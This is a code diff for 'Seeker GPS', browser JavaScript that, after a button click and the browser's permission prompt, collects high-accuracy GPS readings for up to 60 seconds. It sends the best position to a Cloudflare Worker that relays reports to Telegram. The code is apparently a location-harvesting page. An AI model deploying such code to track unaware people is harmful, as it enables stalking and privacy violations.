@@ -1,26 +1,30 @@
 
-// ==========================================
-// SEEKER GPS - MAIN JAVASCRIPT
-// ==========================================
+/* ==========================================
+   SEEKER GPS - PRECISION MODE
+   Version 2.0
+   ========================================== */
 
 
-// ==========================================
-// CONFIGURATION
-// ==========================================
+/* ==========================================
+   CONFIGURATION
+   ========================================== */
 
 const locationBtn = document.getElementById("locationBtn");
 const result = document.getElementById("result");
 
-// IMPORTANT:
-// Use the standalone API Worker that has been tested successfully.
-
 const WORKER_URL =
     "https://dark-hill-bae4.ykzir-polyglot.workers.dev/api/report";
 
+// GPS acquisition settings
 
-// ==========================================
-// 1. DEVICE INFORMATION READER
-// ==========================================
+const GPS_TIMEOUT = 60000;       // Maximum 60 seconds
+const TARGET_ACCURACY = 10;      // Stop early at 10 meters
+const GPS_MAXIMUM_AGE = 0;       // Do not use cached positions
+
+
+/* ==========================================
+   1. DEVICE INFORMATION READER
+   ========================================== */
 
 function getDeviceInfo() {
 
@@ -76,11 +80,291 @@ function getDeviceInfo() {
 }
 
 
-// ==========================================
-// 2. SEND REPORT TO CLOUDFLARE
-// ==========================================
+/* ==========================================
+   2. PRECISION GPS ACQUISITION
+   ========================================== */
 
-async function sendLocation(latitude, longitude, accuracy) {
+function acquireBestGPS() {
+
+    return new Promise((resolve, reject) => {
+
+        if (!navigator.geolocation) {
+
+            reject(
+                new Error("GPS is not supported by this browser.")
+            );
+
+            return;
+
+        }
+
+        let watchId = null;
+        let timeoutId = null;
+
+        let bestPosition = null;
+        let readings = 0;
+        let finished = false;
+
+        const startedAt = Date.now();
+
+        function finish(position, error = null) {
+
+            if (finished) return;
+
+            finished = true;
+
+            if (watchId !== null) {
+
+                navigator.geolocation.clearWatch(watchId);
+
+            }
+
+            if (timeoutId !== null) {
+
+                clearTimeout(timeoutId);
+
+            }
+
+            if (error) {
+
+                reject(error);
+
+                return;
+
+            }
+
+            if (!position) {
+
+                reject(
+                    new Error("No GPS position was received.")
+                );
+
+                return;
+
+            }
+
+            const acquisitionTime =
+                Date.now() - startedAt;
+
+            const gpsResult = {
+
+                latitude: position.coords.latitude,
+
+                longitude: position.coords.longitude,
+
+                accuracy: position.coords.accuracy,
+
+                readings: readings,
+
+                acquisitionTime: acquisitionTime,
+
+                gpsTimestamp: position.timestamp
+
+            };
+
+            console.log(
+                "SEEKER GPS: BEST POSITION SELECTED",
+                gpsResult
+            );
+
+            resolve(gpsResult);
+
+        }
+
+
+        /* ==================================
+           GPS LOCATION ERROR HANDLER
+           ================================== */
+
+        function handleLocationError(error) {
+
+            console.error(
+                "SEEKER GPS ACQUISITION ERROR:",
+                error
+            );
+
+            // Preserve the best position already obtained.
+
+            if (bestPosition) {
+
+                finish(bestPosition);
+
+                return;
+
+            }
+
+            let message =
+                "Unable to obtain GPS location.";
+
+            switch (error.code) {
+
+                case 1:
+                    message =
+                        "Location permission was denied.";
+                    break;
+
+                case 2:
+                    message =
+                        "GPS location is unavailable. Check your device location settings.";
+                    break;
+
+                case 3:
+                    message =
+                        "GPS acquisition timed out without receiving a position.";
+                    break;
+
+            }
+
+            finish(null, new Error(message));
+
+        }
+
+
+        /* ==================================
+           CONTINUOUS GPS MONITORING
+           ================================== */
+
+        try {
+
+            watchId = navigator.geolocation.watchPosition(
+
+                function(position) {
+
+                    if (finished) return;
+
+                    readings++;
+
+                    const accuracy =
+                        position.coords.accuracy;
+
+                    console.log(
+                        "GPS READING #" + readings,
+                        {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: accuracy
+                        }
+                    );
+
+
+                    // Compare current reading
+                    // against the best previous reading.
+
+                    if (
+                        !bestPosition ||
+                        accuracy < bestPosition.coords.accuracy
+                    ) {
+
+                        bestPosition = position;
+
+                        console.log(
+                            "SEEKER GPS: NEW BEST ACCURACY:",
+                            accuracy,
+                            "meters"
+                        );
+
+                    }
+
+
+                    // Update user interface.
+
+                    if (result) {
+
+                        result.textContent =
+                            "GPS scanning... " +
+                            "Best accuracy: " +
+                            bestPosition.coords.accuracy.toFixed(1) +
+                            " meters | Readings: " +
+                            readings;
+
+                    }
+
+
+                    // Stop early if target accuracy is reached.
+
+                    if (
+                        bestPosition.coords.accuracy <=
+                        TARGET_ACCURACY
+                    ) {
+
+                        console.log(
+                            "SEEKER GPS: TARGET ACCURACY REACHED."
+                        );
+
+                        finish(bestPosition);
+
+                    }
+
+                },
+
+                handleLocationError,
+
+                {
+                    enableHighAccuracy: true,
+                    timeout: GPS_TIMEOUT + 5000,
+                    maximumAge: GPS_MAXIMUM_AGE
+                }
+
+            );
+
+        } catch (error) {
+
+            finish(
+                null,
+                new Error(
+                    "Unable to start GPS monitoring: " +
+                    error.message
+                )
+            );
+
+            return;
+
+        }
+
+
+        /* ==================================
+           MAXIMUM ACQUISITION TIME
+           ================================== */
+
+        timeoutId = setTimeout(function() {
+
+            if (finished) return;
+
+            console.log(
+                "SEEKER GPS: 60 SECOND TIME LIMIT REACHED."
+            );
+
+            if (bestPosition) {
+
+                finish(bestPosition);
+
+            } else {
+
+                finish(
+                    null,
+                    new Error(
+                        "GPS timeout: No location readings received within 60 seconds."
+                    )
+                );
+
+            }
+
+        }, GPS_TIMEOUT);
+
+    });
+
+}
+
+
+/* ==========================================
+   3. SEND REPORT TO CLOUDFLARE
+   ========================================== */
+
+async function sendLocation(
+    latitude,
+    longitude,
+    accuracy
+) {
 
     const report = {
 
@@ -96,8 +380,14 @@ async function sendLocation(latitude, longitude, accuracy) {
 
     };
 
-    console.log("SEEKER GPS: Sending report to Cloudflare...");
-    console.log("SEEKER GPS: Report prepared.");
+    console.log(
+        "SEEKER GPS: Sending best position to Cloudflare..."
+    );
+
+    console.log(
+        "SEEKER GPS: Final report:",
+        report
+    );
 
     let response;
 
@@ -108,7 +398,9 @@ async function sendLocation(latitude, longitude, accuracy) {
             method: "POST",
 
             headers: {
+
                 "Content-Type": "application/json"
+
             },
 
             body: JSON.stringify(report)
@@ -127,6 +419,7 @@ async function sendLocation(latitude, longitude, accuracy) {
         );
 
     }
+
 
     console.log(
         "Cloudflare HTTP Status:",
@@ -152,26 +445,33 @@ async function sendLocation(latitude, longitude, accuracy) {
 
     }
 
+
     console.log(
         "Cloudflare Response:",
         data
     );
 
-    // Worker returns success, not ok.
 
     if (!response.ok || data.success !== true) {
 
         const errorMessage = [
-            data.error || "Cloudflare backend request failed.",
+
+            data.error ||
+            "Cloudflare backend request failed.",
+
             data.telegram_error_code
-                ? "Telegram error code: " + data.telegram_error_code
+                ? "Telegram error code: " +
+                  data.telegram_error_code
                 : "",
+
             data.telegram_description || ""
+
         ].filter(Boolean).join(" | ");
 
         throw new Error(errorMessage);
 
     }
+
 
     console.log(
         "SEEKER GPS: Telegram delivery confirmed."
@@ -182,9 +482,160 @@ async function sendLocation(latitude, longitude, accuracy) {
 }
 
 
-// ==========================================
-// 3. LOCATION BUTTON EVENT
-// ==========================================
+/* ==========================================
+   4. START PRECISION GPS
+   ========================================== */
+
+async function startPrecisionGPS() {
+
+    if (locationBtn.disabled) {
+
+        return;
+
+    }
+
+
+    // Check browser GPS support.
+
+    if (!navigator.geolocation) {
+
+        result.textContent =
+            "GPS is not supported by this browser.";
+
+        return;
+
+    }
+
+
+    // Check HTTPS security.
+
+    if (!window.isSecureContext) {
+
+        result.textContent =
+            "GPS requires a secure HTTPS connection.";
+
+        return;
+
+    }
+
+
+    locationBtn.disabled = true;
+
+    result.textContent =
+        "Requesting location permission...";
+
+
+    console.log(
+        "SEEKER GPS: PRECISION MODE STARTED."
+    );
+
+
+    try {
+
+        /* ==================================
+           STEP 1: ACQUIRE BEST GPS POSITION
+           ================================== */
+
+        result.textContent =
+            "Searching for the most accurate GPS position...";
+
+        const gps = await acquireBestGPS();
+
+
+        /* ==================================
+           STEP 2: DISPLAY BEST RESULT
+           ================================== */
+
+        console.log(
+            "SEEKER GPS FINAL LATITUDE:",
+            gps.latitude
+        );
+
+        console.log(
+            "SEEKER GPS FINAL LONGITUDE:",
+            gps.longitude
+        );
+
+        console.log(
+            "SEEKER GPS FINAL ACCURACY:",
+            gps.accuracy
+        );
+
+        console.log(
+            "TOTAL GPS READINGS:",
+            gps.readings
+        );
+
+        console.log(
+            "GPS ACQUISITION TIME:",
+            (gps.acquisitionTime / 1000).toFixed(1),
+            "seconds"
+        );
+
+
+        result.textContent =
+            "Best GPS position obtained: " +
+            gps.accuracy.toFixed(1) +
+            " meters. Sending report...";
+
+
+        /* ==================================
+           STEP 3: SEND BEST POSITION
+           ================================== */
+
+        const response = await sendLocation(
+
+            gps.latitude,
+
+            gps.longitude,
+
+            gps.accuracy
+
+        );
+
+
+        /* ==================================
+           STEP 4: CONFIRM DELIVERY
+           ================================== */
+
+        if (response.success === true) {
+
+            result.textContent =
+                "Location report delivered successfully! " +
+                "Accuracy: " +
+                gps.accuracy.toFixed(1) +
+                " meters. Readings: " +
+                gps.readings;
+
+            console.log(
+                "SEEKER GPS: REPORT DELIVERED SUCCESSFULLY."
+            );
+
+        }
+
+    } catch (error) {
+
+        console.error(
+            "SEEKER GPS ERROR:",
+            error
+        );
+
+        result.textContent =
+            "SEEKER GPS ERROR: " +
+            error.message;
+
+    } finally {
+
+        locationBtn.disabled = false;
+
+    }
+
+}
+
+
+/* ==========================================
+   5. LOCATION BUTTON EVENT
+   ========================================== */
 
 if (!locationBtn || !result) {
 
@@ -194,191 +645,14 @@ if (!locationBtn || !result) {
 
 } else {
 
-    locationBtn.addEventListener("click", function() {
-
-        // Prevent multiple simultaneous requests.
-
-        if (locationBtn.disabled) {
-            return;
-        }
-
-        // Check browser geolocation support.
-
-        if (!navigator.geolocation) {
-
-            result.textContent =
-                "GPS is not supported by this browser.";
-
-            return;
-
-        }
-
-        // Check secure HTTPS context.
-
-        if (!window.isSecureContext) {
-
-            result.textContent =
-                "GPS requires a secure HTTPS connection.";
-
-            return;
-
-        }
-
-        locationBtn.disabled = true;
-
-        result.textContent =
-            "Requesting location permission...";
-
-        console.log(
-            "SEEKER GPS: Waiting for user location permission."
-        );
-
-        // Request location only after explicit button click.
-
-        navigator.geolocation.getCurrentPosition(
-
-            // ==================================
-            // LOCATION SUCCESS
-            // ==================================
-
-            async function(position) {
-
-                const latitude =
-                    position.coords.latitude;
-
-                const longitude =
-                    position.coords.longitude;
-
-                const accuracy =
-                    position.coords.accuracy;
-
-                console.log(
-                    "Latitude:",
-                    latitude
-                );
-
-                console.log(
-                    "Longitude:",
-                    longitude
-                );
-
-                console.log(
-                    "Accuracy:",
-                    accuracy
-                );
-
-                const device = getDeviceInfo();
-
-                console.log(
-                    "Device Information:",
-                    device
-                );
-
-                result.textContent =
-                    "Location obtained. Sending report to server...";
-
-                try {
-
-                    const response = await sendLocation(
-                        latitude,
-                        longitude,
-                        accuracy
-                    );
-
-                    if (response.success === true) {
-
-                        result.textContent =
-                            "Location report successfully delivered!";
-
-                        console.log(
-                            "SEEKER GPS: REPORT DELIVERED SUCCESSFULLY"
-                        );
-
-                    }
-
-                } catch (error) {
-
-                    console.error(
-                        "SEEKER GPS BACKEND ERROR:",
-                        error
-                    );
-
-                    result.textContent =
-                        "Location obtained, but server delivery failed: " +
-                        error.message;
-
-                } finally {
-
-                    locationBtn.disabled = false;
-
-                }
-
-            },
-
-
-            // ==================================
-            // LOCATION ERROR
-            // ==================================
-
-            function(error) {
-
-                console.error(
-                    "SEEKER GPS LOCATION ERROR:",
-                    error
-                );
-
-                switch (error.code) {
-
-                    case 1:
-
-                        result.textContent =
-                            "Location permission was denied.";
-
-                        break;
-
-                    case 2:
-
-                        result.textContent =
-                            "Location information is unavailable.";
-
-                        break;
-
-                    case 3:
-
-                        result.textContent =
-                            "Location request timed out.";
-
-                        break;
-
-                    default:
-
-                        result.textContent =
-                            "An unknown GPS error occurred.";
-
-                }
-
-                locationBtn.disabled = false;
-
-            },
-
-
-            // ==================================
-            // GPS SETTINGS
-            // ==================================
-
-            {
-                enableHighAccuracy: true,
-                timeout: 15000,
-                maximumAge: 0
-            }
-
-        );
-
-    });
+    locationBtn.addEventListener(
+        "click",
+        startPrecisionGPS
+    );
 
 }
 
 
-// ==========================================
-// END OF SEEKER GPS
-// ==========================================
+/* ==========================================
+   END OF SEEKER GPS PRECISION MODE
+   ========================================== */
